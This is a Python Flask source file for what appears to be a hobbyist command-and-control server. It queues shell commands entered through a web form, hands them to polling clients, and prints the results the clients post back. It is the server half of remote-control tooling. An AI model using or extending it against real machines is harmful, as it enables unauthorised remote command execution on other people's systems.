from flask import Flask, request, jsonify, render_template
import requests
import threading # aw man

SERVER_URL = "http://127.0.0.1:5000"
app = Flask(__name__)

current_command = "whoami" # have something as the default command, just making sure that connection is maintained.
client_commands = {} # 'client_id': ['command1', 'command2'], etc.
# client_commands is a bad name


@app.route('/home')
def home():
    return render_template('home.html')


@app.route('/input-command', methods=['GET', 'POST'])
def input():
    if request.method == 'POST':
        global current_command
        current_command = request.form.get('command')
        print("!!!!!!!!!!current command:", current_command)
        return render_template('home.html', message="command received: "+str(current_command)) # i dont like this. NEED a return statement though


@app.route('/get-command', methods=['GET'])
def get_command(): # pass client_id in
    global current_command
    cmd = current_command
    current_command = "whoami"
    # if client_id in client_commands:
    #     client_commands[client_id].append(new_command)
    # else:
    #     client_commands[client_id] = ["whoami"]
    return jsonify(command=cmd) # what is to be sent to the client (get_command() in client.py)

#TODO: # fix disconnect; specify which client? why are all not disconnecting?

@app.route('/log-client', methods=['GET']) # this is not getting used
def log_client():
    # client_id = # what should this be? hostname? ip? 
    client_id = "fuck" # pass client id in instead
    client_commands[client_id] = "whoami" # dict time -- initial
    print("this is the client_commands dictionary:", client_commands)
    return jsonify(client_id=client_id)


@app.route('/', methods=['POST'])
def command_result():
    result = request.json.get('result') # GET from client
    status = request.args.get('status')
    print("!!!!!!!!!!client command result:\n" + result)
    print(f"client is {status}") # hell yeah maybe put this somewhere else    or take it away altogether cause its in POST
    return jsonify({"status": "success"})


if __name__ == '__main__':
    # app.run(debug=True, host='127.0.0.1', port=5000, threaded=True)
    app.run(debug=True, host='127.0.0.1', port=5000, threaded=True)